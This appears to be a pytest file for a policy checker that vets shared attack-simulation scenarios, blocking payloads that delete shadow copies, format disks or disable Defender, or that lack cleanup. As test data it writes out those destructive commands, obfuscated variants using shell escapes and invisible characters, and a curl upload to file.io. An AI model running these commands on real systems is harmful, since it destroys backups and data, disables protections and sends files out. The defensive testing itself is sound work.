"""Forbidden actions and cleanups: an embedded payload never destroys, encrypts or removes a
protection for good, and every payload that changes the endpoint undoes it.

Characters are written by code point, never raw, so that this file holds none of them."""

from typing import Any

import pytest

from scenario_tools.domain.policy.actions import (
    as_command,
    forbidden_from_document,
    side_effects_from_document,
)
from scenario_tools.domain.policy.registry import policy_findings, rule_findings
from scenario_tools.domain.policy.rules.actions import RULE as FORBIDDEN_RULE
from scenario_tools.domain.policy.rules.cleanup import RULE as CLEANUP_RULE
from scenario_tools.domain.shared.finding import Finding, Severity
from tests.domain.policy.cases import (
    DATA,
    ENTRY,
    FORBIDDEN,
    PAYLOAD,
    SIDE_EFFECTS,
    content,
    with_payload,
)

JSON = f"{ENTRY}/scenario.json"
CLEANUP_MESSAGE = (
    "this payload changes the endpoint (it writes, creates or starts something) but has no "
    "cleanup command with an executor: add one that undoes it"
)


def _found(findings: tuple[Finding, ...], code: str) -> list[str]:
    return [f.field for f in findings if f.code == code]


def test_the_rules_are_pol_004_and_pol_005_and_block() -> None:
    assert (FORBIDDEN_RULE.code, FORBIDDEN_RULE.severity) == ("POL-004", Severity.BLOCKING)
    assert (CLEANUP_RULE.code, CLEANUP_RULE.severity) == ("POL-005", Severity.BLOCKING)


@pytest.mark.parametrize(
    ("text", "read"),
    [
        ("VSSADMIN Delete Shadows", "vssadmin delete shadows"),
        ("v^ss^admin delete", "vssadmin delete"),  # cmd escapes
        ("vss`admin delete", "vssadmin delete"),  # PowerShell escapes
        ("vssadmin \"delete\" 'shadows'", "vssadmin delete shadows"),
        ("vssadmin\t  delete", "vssadmin delete"),
        ("vssadmin\n  delete", "vssadmin ; delete"),
        ("vss" + chr(0x200B) + "admin", "vssadmin"),  # an invisible character
        (chr(0xFF56) + "ssadmin", "vssadmin"),  # a compatibility form
        ('&("vssa"+"dmin") delete', "&(vssadmin) delete"),  # quoted pieces joined
        ("&('vssa' + 'dmin')", "&(vssadmin)"),
        ("a\nb\r\nc", "a ; b ; c"),  # each line a statement
    ],
)
def test_a_command_is_read_as_a_shell_reads_it(text: str, read: str) -> None:
    assert as_command(text) == read


def test_the_lists_are_read() -> None:
    forbidden = forbidden_from_document(FORBIDDEN)

    assert [
        (a.pattern.pattern, a.why, a.restore.pattern if a.restore else None) for a in forbidden
    ] == [
        (r"\bvssadmin\b.*\bdelete\b", "deletes shadow copies", None),
        (
            r"\bset-mppreference\b[^;&|]{0,300}\s-disable\w*\s+(\$true|1)",
            "turns off an antivirus protection",
            r"\bset-mppreference\b[^;&|]{0,300}\s-disable\w*\s+(\$false|0)",
        ),
        (r"\bformat(\.com)?\s+[a-z]:", "formats a disk", None),
    ]
    assert [p.pattern for p in side_effects_from_document(SIDE_EFFECTS)] == SIDE_EFFECTS["commands"]


@pytest.mark.parametrize(
    ("document", "message"),
    [
        ([], "forbidden-actions: the document must be a mapping holding actions"),
        ({"actions": "x"}, "forbidden-actions: the document must be a mapping holding actions"),
        ({"actions": [], "x": 1}, "forbidden-actions: unknown keys x"),
        ({"actions": [], "b": 1, "a": 2}, "forbidden-actions: unknown keys a, b"),
        (
            {"actions": [{"pattern": "a", "why": "b", "y": 1, "x": 2}]},
            "forbidden-actions: unknown keys x, y",
        ),
        ({"actions": ["x"]}, "forbidden-actions: an action must be a mapping"),
        ({"actions": [{"pattern": "a", "why": "b", "x": 1}]}, "forbidden-actions: unknown keys x"),
        (
            {"actions": [{"pattern": "a", "why": "b", "protection": True}]},
            "forbidden-actions: unknown keys protection",
        ),
        ({"actions": [{"pattern": 1, "why": "b"}]}, "forbidden-actions: a pattern must be a text"),
        ({"actions": [{"pattern": "(", "why": "b"}]}, "forbidden-actions: a pattern must compile"),
        ({"actions": [{"pattern": "a", "why": ""}]}, "forbidden-actions: why must be a short text"),
        (
            {"actions": [{"pattern": "a", "why": "b" * 121}]},
            "forbidden-actions: why must be a short text",
        ),
        ({"actions": [{"pattern": "a", "why": 1}]}, "forbidden-actions: why must be a short text"),
        (
            {"actions": [{"pattern": "a", "why": "b", "restore": 1}]},
            "forbidden-actions: a pattern must be a text",
        ),
        (
            {"actions": [{"pattern": "a", "why": "b", "restore": "("}]},
            "forbidden-actions: a pattern must compile",
        ),
        (
            {"actions": [{"pattern": "a", "why": "b"}, {"pattern": "a", "why": "c"}]},
            "forbidden-actions: each pattern once",
        ),
    ],
)
def test_a_malformed_list_of_forbidden_actions_is_refused(document: object, message: str) -> None:
    with pytest.raises(ValueError, match=f"^{message}$"):
        forbidden_from_document(document)


@pytest.mark.parametrize(
    ("document", "message"),
    [
        ([], "side-effects: the document must be a mapping holding commands"),
        ({"commands": "x"}, "side-effects: the document must be a mapping holding commands"),
        ({"commands": [], "x": 1}, "side-effects: unknown keys x"),
        ({"commands": [1]}, "side-effects: a pattern must be a text"),
        ({"commands": ["("]}, "side-effects: a pattern must compile"),
        ({"commands": ["a", "a"]}, "side-effects: each pattern once"),
    ],
)
def test_a_malformed_list_of_side_effects_is_refused(document: object, message: str) -> None:
    with pytest.raises(ValueError, match=f"^{message}$"):
        side_effects_from_document(document)


@pytest.mark.parametrize(
    ("payload", "field", "why"),
    [
        (
            {"command_content": "vssadmin delete shadows"},
            "/command_content",
            "deletes shadow copies",
        ),
        (
            {"command_content": "v^ssadmin delete shadows"},
            "/command_content",
            "deletes shadow copies",
        ),
        ({"payload_cleanup_command": "format c:"}, "/payload_cleanup_command", "formats a disk"),
        (
            {"payload_arguments": [{"key": "x", "default_value": "vssadmin delete"}]},
            "/payload_arguments/0/default_value",
            "deletes shadow copies",
        ),
        (
            {"payload_prerequisites": [{"get_command": "x", "check_command": "format d:"}]},
            "/payload_prerequisites/0/check_command",
            "formats a disk",
        ),
        (
            {"payload_prerequisites": [{"get_command": "vssadmin delete"}]},
            "/payload_prerequisites/0/get_command",
            "deletes shadow copies",
        ),
        (
            {"command_content": "Set-MpPreference -DisableRealtimeMonitoring $true"},
            "/command_content",
            "turns off an antivirus protection",
        ),
    ],
)
def test_a_forbidden_action_is_refused(payload: dict[str, Any], field: str, why: str) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    (finding,) = (f for f in findings if f.code == "POL-004")
    assert (finding.severity, finding.path, finding.field, finding.message) == (
        Severity.BLOCKING,
        JSON,
        PAYLOAD + field,
        f"this command {why}, which a shared scenario never does: remove it",
    )


def test_removing_a_protection_is_allowed_when_the_cleanup_restores_it() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true",
        payload_cleanup_command="Set-MpPreference -DisableRealtimeMonitoring $false",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == []


@pytest.mark.parametrize(
    ("cleanup", "executor"),
    [
        ("echo done", "psh"),  # a cleanup that restores nothing
        ("Set-MpPreference -DisableRealtimeMonitoring $false", None),  # never runs
        ("Set-MpPreference -DisableRealtimeMonitoring $false", ""),
    ],
)
def test_removing_a_protection_needs_a_cleanup_that_restores_it(
    cleanup: str, executor: object
) -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true",
        payload_cleanup_command=cleanup,
        payload_cleanup_executor=executor,
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_cleanup_that_removes_a_protection_is_never_exempt() -> None:
    payload = with_payload(
        command_content="whoami",
        payload_cleanup_command=(
            "Set-MpPreference -DisableRealtimeMonitoring $false; "
            "Set-MpPreference -DisableIOAVProtection $true"
        ),
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [
        PAYLOAD + "/payload_cleanup_command"
    ]


def test_a_command_too_long_to_check_is_refused() -> None:
    findings = policy_findings(DATA, with_payload(command_content="a" * 65_537))

    (finding,) = (f for f in findings if f.code == "POL-004")
    assert (finding.field, finding.message) == (
        PAYLOAD + "/command_content",
        "this command is longer than 65536 characters, too long to check: shorten it",
    )


def test_a_command_at_the_bound_is_checked() -> None:
    assert (
        _found(policy_findings(DATA, with_payload(command_content="a" * 65_536)), "POL-004") == []
    )


def test_the_values_an_inject_gives_to_the_payload_s_arguments_are_read() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": {"x\t": "vssadmin delete shadows", "other": "vssadmin delete"},
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "#{x}",
                        "payload_arguments": [{"key": "x", "default_value": "1"}, "y", {"key": 1}],
                    }
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == [
        "/scenario_injects/0/inject_content/x\t"
    ]


@pytest.mark.parametrize(
    "command",
    [
        "Get-Process | Format-Table",
        "vssadmin list shadows",
        "Remove-Item -Path C:\\windows\\temp\\x -Recurse -Force",
        "whoami; net.exe group /DOMAIN",
    ],
)
def test_harmless_commands_pass(command: str) -> None:
    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == []


@pytest.mark.parametrize(
    "payload",
    [
        {"command_content": "copy a b"},
        {"command_content": "sc.exe create Crowdoor binPath= x"},
        {"command_content": "echo test > c:\\x.txt"},
        {"command_content": "whoami", "payload_prerequisites": [{"get_command": "New-Item x"}]},
        {"command_content": "copy a b", "payload_cleanup_command": ""},
        {"command_content": "copy a b", "payload_cleanup_command": "  "},
        {"command_content": "co^py a b"},
        {"command_content": "copy a b", "payload_cleanup_command": "del b"},  # no executor
        {"command_content": "x", "payload_arguments": [{"key": "a", "default_value": "copy a b"}]},
        {"command_content": "x", "payload_prerequisites": [{"check_command": "New-Item x"}]},
        {"payload_type": "Executable"},  # running a file always changes the endpoint
        {"payload_type": "FileDrop"},
    ],
)
def test_a_payload_that_changes_the_endpoint_without_cleanup_is_refused(
    payload: dict[str, Any],
) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    (finding,) = (f for f in findings if f.code == "POL-005")
    assert (finding.severity, finding.path, finding.field, finding.message) == (
        Severity.BLOCKING,
        JSON,
        PAYLOAD + "/payload_cleanup_command",
        CLEANUP_MESSAGE,
    )


@pytest.mark.parametrize(
    "payload",
    [
        {
            "command_content": "copy a b",
            "payload_cleanup_command": "del b",
            "payload_cleanup_executor": "cmd",
        },
        {
            "payload_type": "Executable",
            "payload_cleanup_command": "del x",
            "payload_cleanup_executor": "cmd",
        },
        {"command_content": "whoami"},
        {"command_content": "dir C:\\ 2>$null"},
        {"command_content": "gci x | select FullName"},
        {"payload_type": "Command", "command_content": "whoami"},
        {"command_content": "Remove-Item x -Force"},
        {},
    ],
)
def test_a_payload_that_reads_or_cleans_up_passes(payload: dict[str, Any]) -> None:
    assert _found(policy_findings(DATA, with_payload(**payload)), "POL-005") == []


def test_each_payload_is_judged_on_its_own() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "whoami"}
                }
            },
            {"inject_injector_contract": None},
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "copy a b"}
                }
            },
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-005") == [
        "/scenario_injects/2/inject_injector_contract/injector_contract_payload"
        "/payload_cleanup_command"
    ]


@pytest.mark.parametrize(
    "stored",
    [
        None,
        {"scenario_injects": None},
        {"scenario_injects": ["x", {"inject_injector_contract": "x"}]},
        {"scenario_injects": [{"inject_injector_contract": {"injector_contract_payload": "x"}}]},
        {
            "scenario_injects": [
                {
                    "inject_injector_contract": {
                        "injector_contract_payload": {
                            "command_content": 5,
                            "payload_arguments": ["x", {"default_value": None}],
                            "payload_prerequisites": "x",
                        }
                    }
                }
            ]
        },
        {
            "scenario_injects": [
                {
                    "inject_injector_contract": {
                        "injector_contract_payload": {
                            "payload_prerequisites": ["x", {"get_command": None}],
                        }
                    }
                }
            ]
        },
    ],
)
def test_a_stored_scenario_not_shaped_like_one_is_left_to_its_own_check(stored: object) -> None:
    findings = policy_findings(DATA, content(stored=stored))

    assert [f for f in findings if f.code in ("POL-004", "POL-005")] == []


@pytest.mark.parametrize(
    ("payload", "field"),
    [
        ({"command_content": "curl -F file=@x https://file.io/"}, "/command_content"),
        (
            {"payload_prerequisites": [{"get_command": "Invoke-WebRequest https://curl.se/x"}]},
            "/payload_prerequisites/0/get_command",
        ),
        (
            {"payload_arguments": [{"default_value": "10.0.0.5"}]},
            "/payload_arguments/0/default_value",
        ),
        ({"payload_cleanup_command": "ping 8.8.8.8"}, "/payload_cleanup_command"),
    ],
)
def test_a_payload_naming_a_host_outside_the_allowed_targets_is_refused(
    payload: dict[str, Any], field: str
) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    assert _found(findings, "POL-003") == [PAYLOAD + field]


def test_one_rule_alone_reads_its_lists() -> None:
    failing = with_payload(command_content="vssadmin delete")

    assert [f.code for f in rule_findings("POL-004", DATA, failing)] == ["POL-004"]
    assert rule_findings("POL-005", DATA, failing) == ()


def test_a_reason_of_120_characters_is_short_enough() -> None:
    (action,) = forbidden_from_document({"actions": [{"pattern": "a", "why": "b" * 120}]})

    assert action.why == "b" * 120


def test_every_field_and_every_action_of_a_payload_is_judged() -> None:
    payload = with_payload(
        command_content="a" * 65_537,
        payload_cleanup_command="format c:",
        payload_arguments=["y", {"key": "x", "default_value": "vssadmin delete"}],
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [
        PAYLOAD + "/command_content",
        PAYLOAD + "/payload_cleanup_command",
        PAYLOAD + "/payload_arguments/1/default_value",
    ]


def test_an_exempt_protection_does_not_hide_a_later_action_in_the_same_command() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true ; format c:",
        payload_cleanup_command="Set-MpPreference -DisableRealtimeMonitoring $false",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_every_payload_is_read_whatever_comes_before_it() -> None:
    stored = {
        "scenario_injects": [
            "x",
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "copy a b",
                        "payload_cleanup_command": "del b",
                        "payload_cleanup_executor": "cmd",
                    }
                }
            },
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "copy a b"}
                }
            },
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-005") == [
        "/scenario_injects/2/inject_injector_contract/injector_contract_payload"
        "/payload_cleanup_command"
    ]


def test_an_argument_the_inject_gives_is_reported_at_its_escaped_key() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": {"a~b/c": "vssadmin delete"},
                "inject_injector_contract": {
                    "injector_contract_payload": {"payload_arguments": [{"key": "a~b/c"}]}
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == [
        "/scenario_injects/0/inject_content/a~0b~1c"
    ]
